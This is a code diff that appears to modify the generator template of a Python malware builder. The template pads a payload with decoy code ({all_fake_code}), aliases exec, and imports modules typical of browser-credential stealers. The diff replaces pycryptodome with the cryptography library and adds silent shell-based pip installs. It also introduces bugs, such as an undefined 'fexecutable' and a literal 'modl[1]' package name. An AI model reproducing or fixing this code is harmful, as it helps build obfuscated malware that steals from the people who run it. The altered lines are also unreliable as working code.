@@ -35,14 +35,12 @@ def import_or_install(package_name, import_name=None):
         import_name = package_name
 
     try:
-        return __import__(import_name)
+        return __import__("cryptography")
     except ImportError:
         install_missing_package(package_name)
-        return __import__(import_name)
+        return __import__("cryptography")
 
-# Import or install dependencies
-requests = import_or_install('requests')
-Crypto = import_or_install('pycryptodome', 'Crypto.Cipher')
+Crypto = import_or_install('cryptography', 'cryptography')
 
 # Function Definitions
 def generate_random_string(length=19, chars=string.ascii_letters + string.digits):
@@ -143,19 +141,16 @@ except ImportError:
 import subprocess
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"]
+    ["cryptography", "cryptography"]
 ]
 for modl in requirements:
     try: __import__(modl[0])
     except:
-        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
+        subprocess.Popen(fexecutable + " -m pip install modl[1]", shell=True)
         time.sleep(3)
-try:
-    import cryptography
-except:
-    subprocess.run('python -m pip install cryptography')
+
     
-ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
+ModuleRequirements = [["cryptography", "cryptography"]]
 for module in ModuleRequirements:
     try:        
         __import__(module[0])
@@ -197,32 +192,30 @@ from sys import executable, stderr
 {all_fake_code}
 import ctypes;import base64,subprocess,sqlite3,json,shutil
 import time
-ModuleRequirements = [["Crypto.Cipher", "pycryptodome" if not "PythonSoftwareFoundation" in executable else "Crypto"]]
-try:
-    from Cryptodome.Cipher import AES
-except:
-    subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
-    subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
+ModuleRequirements = [["cryptography", "cryptography"]]
+
 for module in ModuleRequirements:
     try:        
         __import__(module[0])
     except:
         try:
-            subprocess.Popen(executable + " -m pip install pycrypto --quiet", shell=True)
+            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
         except:
-            subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
+            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
 
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"]
+    ["cryptography", "cryptography"]
 ]
 for modl in requirements:
     try: __import__(modl[0])
     except:
-        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
+        subprocess.Popen(fexecutable + " -m pip install modl[1]", shell=True)
         time.sleep(3)
         
-from crypto.Cipher import AES
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
 from json import loads, dumps
 from urllib.request import Request, urlopen
 try:
@@ -240,11 +233,6 @@ try:
 except:
     subprocess.run("python -m pip install requests", shell=True)
 
-try:
-    from Crypto.Cipher import AES
-except:
-    subprocess.run("python -m pip install Crypto.Cipher", shell=True)
-    
 from cryptography.fernet import Fernet
 {all_fake_code}
 {e} = exec
